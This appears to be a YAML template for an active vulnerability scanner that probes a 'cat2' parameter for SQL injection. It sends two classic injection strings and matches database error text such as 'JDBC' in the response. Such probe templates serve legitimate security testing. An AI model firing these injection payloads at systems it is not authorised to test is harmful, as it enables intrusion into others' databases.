id: sqli6-generic-04
name: 'SQLi generic probe in cat2'
severity: high
type: active
tags:
  - sqli
  - injection
  - generic
description: 'Triggers generic error via cat2'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      cat2:
        - ''' OR ''1''=''1'
        - ''' UNION SELECT NULL--'
    matchers:
      - type: regex
        part: body
        regex:
          - 'JDBC'
          - 'Warning: mysql'
